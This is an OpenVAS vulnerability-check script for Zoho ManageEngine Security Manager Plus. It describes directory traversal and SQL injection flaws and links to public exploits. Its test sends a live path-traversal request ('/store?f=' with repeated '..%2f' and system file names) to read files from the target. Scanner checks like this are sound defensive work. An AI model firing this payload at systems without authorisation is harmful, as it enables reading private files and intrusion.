###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_sec_mangr_plus_mult_vuln.nasl 12634 2018-12-04 07:26:26Z cfischer $
#
# Zoho ManageEngine Security Manager Plus Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802483");
  script_version("$Revision: 12634 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-12-04 08:26:26 +0100 (Tue, 04 Dec 2018) $");
  script_tag(name:"creation_date", value:"2012-10-22 13:33:50 +0530 (Mon, 22 Oct 2012)");
  script_name("Zoho ManageEngine Security Manager Plus Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22092/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22093/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22094/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117520/manageenginesmp-sql.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117522/manageengine-sql.rb.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117519/manageenginemp-traversal.txt");
  script_xref(name:"URL", value:"http://bonitas.zohocorp.com/4264259/scanfi/31May2012/SMP_Vul_fix.zip");
  script_xref(name:"URL", value:"http://www.manageengine.com/products/security-manager");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 6262);
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to perform
  directory traversal attacks, read/download the arbitrary files and to manipulate
  SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"ManageEngine Security Manager Plus version 5.5 build 5505
  and prior");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - An input passed to the 'f' parameter via 'store' script is not properly
  sanitised before being used. This allows to download the complete database
  and thus gather logins which lead to uploading web site files which could
  be used for malicious actions

  - The SQL injection is possible on the 'Advanced Search', the input is not
  validated correctly.");

  script_tag(name:"solution", value:"Apply the patch from the referenced link or update to latest version.");

  script_tag(name:"summary", value:"This host is running Zoho ManageEngine Security Manager Plus
  and is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:6262);

if(http_vuln_check(port:port, url:"/SecurityManager.cc",
                   pattern:">Security Manager Plus</",
                   check_header:TRUE,  extra_check:'ZOHO Corp'))

{

  files = traversal_files();

  foreach file (keys(files))
  {
    url = "/store?f=" + crap(data:"..%2f",length:3*15) + files[file];

    if(http_vuln_check(port:port, url:url,pattern:file))
    {
      security_message(port:port);
      exit(0);
    }
  }
}
